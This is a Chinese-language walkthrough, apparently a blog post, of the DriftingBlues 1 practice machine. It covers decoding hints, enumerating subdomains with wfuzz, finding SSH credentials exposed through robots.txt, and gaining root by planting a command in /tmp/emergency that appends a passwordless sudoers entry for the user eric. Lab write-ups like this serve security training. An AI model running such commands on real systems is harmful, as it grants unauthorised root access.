+++
title = "DriftingBlues  1"
date = 2026-06-15T20:16:14+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301191826590.png)

访问源代码有一串base64的编码 

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301192517573.png)

解码     /noteforkingfish.txt

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301193205989.png)
发现了ook编码

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301193236535.png)

解码看看

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301193537623.png)

发现需要将  host  域名给放进去

my man, i know you are new but you should know how to use host file to reach our secret location. -eric


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301194037359.png)
已经添加进去

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301194617195.png)

然后进行枚举子域名   发现一个test的域名

```
wfuzz -c -u 'driftingblues.box' -H "Host:FUZZ.driftingblues.box" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 570
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301201322321.png)

User-agent: * Disallow: /ssh_cred.txt Allow: /never Allow: /never/gonna Allow: /never/gonna/give Allow: /never/gonna/give/up

然后访问里面的  /ssh_cred.txt
 

we can use ssh password in case of emergency. it was "1mw4ckyyucky". sheryl once told me that she added a number to the end of the password. -db


然后是    1mw4ckyyucky6 

用ssh来连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301202037731.png)

# flag1

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301202110992.png)


尝试监听定时事件。发现一个 /var/backups/backup.sh

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301202247576.png)

 将 eric 添加到 sudoers 中，并且不需要密码

```
echo "eric ALL=NOPASSWD:ALL" >> /etc/sudoers
```

```
echo 'echo "eric ALL=NOPASSWD:ALL" >> /etc/sudoers' > /tmp/emergency
```


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301204254606.png)

成功执行了

# flag2

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260301204339024.png)











 




